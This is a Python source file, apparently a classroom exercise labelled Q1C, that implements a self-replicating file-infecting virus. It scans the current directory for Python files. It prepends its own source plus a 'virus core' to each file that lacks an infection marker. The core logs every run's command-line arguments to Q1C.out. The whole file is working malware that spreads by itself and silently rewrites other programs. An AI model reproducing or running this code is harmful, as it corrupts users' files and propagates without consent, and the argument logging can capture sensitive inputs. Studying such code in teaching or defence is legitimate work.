import os

def ensure_file_infected(target_file, virus_core, virus_infector, flag):
    # check if the file is already infected
    target_file_contents = ""
    with open(target_file, "r") as file:
        target_file_contents = file.read()


    # infect the file if it has not already been infected
    if flag not in target_file_contents:
        with open(target_file, "w") as file:
            file.write(virus_infector)
            file.write(virus_core)
            file.write(target_file_contents)
        print("Done")
    else:
        print("File was already infected!")

if __name__ == "__main__":
    # find all python files in cwd
    current_directory = os.getcwd()
    files = os.listdir(current_directory)
    py_files = []
    for file in files:
        if file.endswith(".py"):
            py_files.append(file)


    virus_core = """
# VIRUS CORE STARTS HERE
   
import sys
with open("Q1C.out", "a") as txt_file:
    for arg in sys.argv:
        txt_file.write(arg + ' ')
    txt_file.write('\\n')


# VIRUS CORE ENDS HERE


"""

    virus_infector = ""
    with open("Q1C.py", "r") as f:
        virus_infector = f.read()


    flag = "    'Infected by virus'"


    for py_file in py_files:
        print(f"Infecting {py_file}... ", end="")
        ensure_file_infected(py_file, virus_core, virus_infector, flag)


# VIRUS INFECTOR ENDS HERE
